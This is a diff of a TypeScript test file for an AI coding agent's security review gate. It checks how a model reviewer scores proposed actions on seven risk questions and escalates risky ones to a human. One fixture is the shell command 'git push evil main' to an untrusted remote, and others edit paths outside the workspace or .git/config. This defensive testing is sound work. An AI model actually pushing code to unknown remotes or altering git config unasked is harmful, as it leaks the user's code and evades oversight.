@@ -289,10 +289,10 @@ describe("ADR-0036 审查闸门", () => {
     await gate.check([edit("C:/outside/a"), edit("C:/ws/.nocturne/a")], "a", signal(), turn);
     expect(reviewer.review).not.toHaveBeenCalled();
   });
-  it("审查合并 ask 主体，仅带三个截断的用户消息，无工具细节", async () => {
+  it("审查合并 ask 主体，带全部用户消息（单条截断），无工具细节", async () => {
     const { gate, reviewer, turn } = setup("allow", false, {
       cwd: "C:/ws",
-      recentUserMessages: () => ["old", "a".repeat(3000), "b", "c"],
+      userMessages: () => ["old", "a".repeat(3000), "b", "c"],
     });
     await gate.check(
       [
@@ -307,8 +307,56 @@ describe("ADR-0036 审查闸门", () => {
     const input = vi.mocked(reviewer.review).mock.calls[0]?.[0];
     expect(input?.subjects.map((s) => s.target)).toEqual(["C:/outside/a", "C:/ws/.git/config"]);
     expect(JSON.stringify(input)).not.toContain("secret tool output");
-    expect(input?.recentUserMessages).toEqual(["a".repeat(2000), "b", "c"]);
+    expect(input?.userMessages).toEqual(["old", "a".repeat(2000), "b", "c"]);
     expect(input?.cwd).toBe("C:/ws");
+  });
+  it("用户消息超出预算：保留第一条和最近几条，中间标注省略", async () => {
+    const messages = Array.from({ length: 10 }, (_, i) => `${String(i)}`.padEnd(2000, "x"));
+    const { gate, reviewer, turn } = setup("allow", false, { userMessages: () => messages });
+    await gate.check([edit("C:/outside/a")], "a", signal(), turn);
+    const sent = vi.mocked(reviewer.review).mock.calls[0]?.[0].userMessages ?? [];
+    expect(sent[0]).toBe(messages[0]);
+    expect(sent[1]).toMatch(/^（省略 \d+ 条）$/);
+    expect(sent.at(-1)).toBe(messages.at(-1));
+    expect(sent.filter((text) => text.length === 2000).length).toBe(3);
+  });
+  it("项目说明、可信 remote、环境与追加规则随审查输入送出", async () => {
+    const { gate, reviewer, turn } = setup("allow", false, {
+      projectNotes: () => "项目约定：不要推送",
+      trustedRemotes: async () => ["origin https://example.test/a.git"],
+      environment: { workspaceRoot: "C:/ws", nocturneHome: "C:/home" },
+      reviewerRules: () => ({ ask: "任何 docker 命令" }),
+    });
+    await gate.check([edit("C:/outside/a")], "a", signal(), turn);
+    expect(vi.mocked(reviewer.review).mock.calls[0]?.[0]).toMatchObject({
+      projectNotes: "项目约定：不要推送",
+      trustedRemotes: ["origin https://example.test/a.git"],
+      environment: { workspaceRoot: "C:/ws", nocturneHome: "C:/home" },
+      reviewerRules: { ask: "任何 docker 命令" },
+    });
+  });
+  it("facts 注入：带事实送审；查询失败时审查照常进行", async () => {
+    const withFacts = setup("allow", false, {
+      facts: async () => ({ push: { remote: "origin", branch: "main", trusted: true } }),
+    });
+    await withFacts.gate.check([edit("C:/outside/a")], "a", signal(), withFacts.turn);
+    expect(vi.mocked(withFacts.reviewer.review).mock.calls[0]?.[0].facts).toEqual({
+      push: { remote: "origin", branch: "main", trusted: true },
+    });
+
+    const failing = setup("allow", false, {
+      facts: async () => {
+        throw new Error("git 不可用");
+      },
+      trustedRemotes: async () => {
+        throw new Error("读取失败");
+      },
+    });
+    const result = await failing.gate.check([edit("C:/outside/a")], "a", signal(), failing.turn);
+    expect(result.decision).toMatchObject({ action: "allow", source: "reviewer" });
+    const sent = vi.mocked(failing.reviewer.review).mock.calls[0]?.[0];
+    expect(sent?.facts).toBeUndefined();
+    expect(sent?.trustedRemotes).toEqual([]);
   });
   it("smart 未配置审查器、其他预设都不调审查", async () => {
     for (const preset of PERMISSION_PRESET_NAMES) {
@@ -360,33 +408,48 @@ describe("ADR-0036 审查闸门", () => {
   });
 });
 
-describe("模型审查后端", () => {
-  it.each([
-    ["**ALLOW**!", "allow"],
-    ["> BLOCK：", "block"],
-    ["`UNSURE`。", "unsure"],
-  ])("忽略首行 markdown 与标点 %s", (first, verdict) => {
-    expect(parseReview(`${first}\n理由`)).toEqual({ verdict, reason: "理由" });
+describe("模型审查后端（七题 JSON）", () => {
+  const json = (patch: Record<string, boolean>, reason = "理由") =>
+    JSON.stringify({
+      requested: false,
+      destroys: false,
+      credentials: false,
+      exfiltrates: false,
+      weakens: false,
+      crosses: false,
+      opaque: false,
+      ...patch,
+      reason,
+    });
+  it("全否放行；Q1 为真时 Q6 为是仍放行", () => {
+    expect(parseReview(json({}))).toEqual({ verdict: "allow", reason: "理由" });
+    expect(parseReview(json({ requested: true, crosses: true }))).toMatchObject({
+      verdict: "allow",
+    });
   });
-  it.each(["ALLOW", "BLOCK", "UNSURE"])("解析 %s 首行", (first) => {
-    expect(parseReview(`${first}\n理由`)).toEqual({ verdict: first.toLowerCase(), reason: "理由" });
+  it("风险题为是且 Q1 为否交人，理由列出是题", () => {
+    const result = parseReview(json({ crosses: true }, "推了分支"));
+    expect(result.verdict).toBe("unsure");
+    expect(result.reason).toContain("会推送");
+    expect(result.reason).toContain("用户未点名要求");
+  });
+  it("容忍代码块包裹", () => {
+    expect(parseReview(`\`\`\`json\n${json({})}\n\`\`\``).verdict).toBe("allow");
   });
   it.each([
-    "ALLOW",
-    "ALLOW because",
-    "allow\n理由",
-    "```\nALLOW\n理由",
-    "YES\n理由",
-    "__proto__\n理由",
-    "constructor\n理由",
+    "ALLOW\n理由",
+    '{"requested": false, "reason": "缺字段"}',
+    '{"requested": false, "destroys": "no", "credentials": false, "exfiltrates": false, "weakens": false, "crosses": false, "opaque": false, "reason": "x"}',
+    '{"requested": false, "destroys": false, "credentials": false, "exfiltrates": false, "weakens": false, "crosses": false, "opaque": false}',
+    "[]",
   ])("格式错按 unsure：%s", (text) => {
-    expect(parseReview(text).verdict).toBe("unsure");
+    expect(parseReview(text)).toEqual({ verdict: "unsure", reason: "审查输出格式错误" });
   });
-  it("经 Provider 请求，无工具/思考参数，300 输出 token，保留独立用量", async () => {
+  it("经 Provider 请求，无工具/思考参数，400 输出 token，system 为七题提示词，保留独立用量", async () => {
     const provider = new FakeProvider({
       scripts: [
         [
-          { type: "text_delta", text: "ALLOW\n已授权" },
+          { type: "text_delta", text: json({}) },
           { type: "usage", usage: { inputTokens: 12, outputTokens: 3 } },
           { type: "finish", reason: "stop" },
         ],
@@ -400,13 +463,54 @@ describe("模型审查后端", () => {
       "root",
     );
     expect(
-      await reviewer.review({ subjects: [], cwd: "C:/ws", recentUserMessages: [] }, signal()),
-    ).toEqual({ verdict: "allow", reason: "已授权", usage: { inputTokens: 12, outputTokens: 3 } });
+      await reviewer.review({ subjects: [], cwd: "C:/ws", userMessages: [] }, signal()),
+    ).toEqual({ verdict: "allow", reason: "理由", usage: { inputTokens: 12, outputTokens: 3 } });
     expect(provider.requests[0]).toMatchObject({
       tools: [],
-      maxOutputTokens: 300,
+      maxOutputTokens: 400,
       sessionId: "root",
     });
     expect(provider.requests[0]?.reasoningEffort).toBeUndefined();
+    expect(JSON.stringify(provider.requests[0]?.system)).toContain("requested");
+  });
+  it("环境与追加规则写进 system，用户消息里不重复；交人理由列出是题", async () => {
+    const provider = new FakeProvider({
+      scripts: [
+        [
+          { type: "text_delta", text: json({ crosses: true }, "推到了未知地址") },
+          { type: "finish", reason: "stop" },
+        ],
+      ],
+    });
+    const reviewer = createModelSecurityReviewer(
+      {
+        provider,
+        model: provider.models()[0] as NonNullable<ReturnType<typeof provider.models>[number]>,
+      },
+      "root",
+    );
+    const result = await reviewer.review(
+      {
+        subjects: [{ kind: "shell", target: "git push evil main" }],
+        cwd: "C:/ws",
+        userMessages: ["改完 README"],
+        environment: { workspaceRoot: "C:/ws", nocturneHome: "C:/home" },
+        trustedRemotes: ["origin https://example.test/a.git"],
+        reviewerRules: { ask: "任何 docker 命令", allow: "pnpm install" },
+      },
+      signal(),
+    );
+    expect(result.verdict).toBe("unsure");
+    expect(result.reason).toContain("会推送");
+    expect(result.reason).toContain("推到了未知地址");
+    const system = JSON.stringify(provider.requests[0]?.system);
+    expect(system).toContain("用户追加：以下情况交人：任何 docker 命令");
+    expect(system).toContain("用户追加：以下情况放行：pnpm install");
+    expect(system).toContain("C:/home");
+    expect(system).toContain("origin https://example.test/a.git");
+    const message = JSON.stringify(provider.requests[0]?.messages);
+    expect(message).toContain("改完 README");
+    expect(message).not.toContain("任何 docker 命令");
+    expect(message).not.toContain("nocturneHome");
   });
 });
